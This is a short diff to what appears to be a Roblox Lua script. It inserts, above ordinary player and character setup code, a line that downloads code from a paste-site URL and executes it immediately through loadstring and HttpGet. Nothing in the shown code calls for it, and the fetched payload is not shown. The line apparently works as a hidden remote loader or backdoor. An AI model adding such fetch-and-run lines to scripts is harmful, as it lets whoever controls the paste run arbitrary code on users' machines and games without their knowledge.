@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/gJGLBAOW/raw"))()
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
